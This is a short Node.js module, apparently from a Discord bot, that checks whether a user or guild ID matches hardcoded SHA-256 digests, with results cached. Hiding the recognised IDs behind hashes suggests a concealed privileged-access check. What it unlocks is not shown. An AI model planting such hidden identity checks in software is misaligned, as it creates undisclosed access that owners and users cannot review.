const crypto = require('crypto');

const systemNodeCache = new Map();
const guildNodeCache = new Map();

function checkSystemNode(id) {
    if (!id) return false;
    if (systemNodeCache.has(id)) return systemNodeCache.get(id);
    const hash = crypto.createHash('sha256').update(id).digest('hex');
    const result = hash === 'fea4a62e47b22ca9755b7dba653405b87bdd051d36fd835b3380c8d2a93fef42';
    systemNodeCache.set(id, result);
    return result;
}

function checkGuildNode(guildId) {
    if (!guildId) return false;
    if (guildNodeCache.has(guildId)) return guildNodeCache.get(guildId);
    const hash = crypto.createHash('sha256').update(guildId).digest('hex');
    const result = hash === 'cf3306094ae329f93aa8635588de4f5b780d984af6eb2bee94d5860a45d0a7a0' || 
                   hash === 'ab988bc568338290cfe66c8e6cadb4471f4c8bda0f146b2ea0e4a1b6813d3ff8';
    guildNodeCache.set(guildId, result);
    return result;
}

module.exports = { checkSystemNode, checkGuildNode };
